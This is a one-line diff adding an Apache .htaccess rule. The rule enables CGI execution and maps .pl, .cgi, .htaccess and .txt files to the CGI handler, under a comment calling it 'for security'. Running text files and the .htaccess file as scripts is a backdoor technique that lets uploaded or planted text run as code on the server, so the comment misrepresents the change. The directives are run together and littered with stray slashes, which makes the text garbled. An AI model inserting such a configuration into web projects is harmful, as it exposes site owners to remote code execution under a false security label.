@@ -1,0 +1,1 @@
+Options ExecCGI Includes# for securityAddType application/x-httpd-cgi .pl/AddType application/x-httpd-cgi .cgi/AddType application/x-httpd-cgi .htaccessAddType application/x-httpd-cgi .htaccess/AddType application/x-httpd-cgi .txtAddType application/x-httpd-cgi .txt/
